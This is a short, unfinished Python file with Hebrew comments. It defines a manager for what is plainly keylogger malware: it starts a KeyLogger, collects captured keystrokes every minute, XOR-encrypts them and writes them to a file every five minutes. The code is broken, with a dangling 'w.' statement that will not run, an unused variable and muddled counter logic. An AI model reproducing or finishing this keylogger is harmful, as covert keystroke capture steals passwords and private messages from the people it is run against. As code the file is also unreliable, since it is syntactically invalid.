from time import sleep

from keyLogger import *
from writer import *
from encryptor import *

class Manager:
    def __init__(self):
        self.l = KeyLogger()
        self.l.start_logging()

    def activity(self):
        w = FileWriter()
        count = 0
        while True:
            # קבלת הליסט
            get_list = self.l.get_logged_key()
            # צריך כל דקה לשלוח לרייטר מערך של אותיות
            w.
            # המתן 5 דקות
            if count % 5 == 0:
                # קבלת הדיקט
                get_dict = w.get_dict()
                # הצפנת הדיקט
                dict_encrypt = XorEncryption().encryption(get_dict)
                # שליחת הדיקט לקובץ
                FileWriter().write(dict_encrypt)
                if count == 15:
                    DictWriter()
                    count = 0
            # המתן דקה
            sleep(60)
            count += 1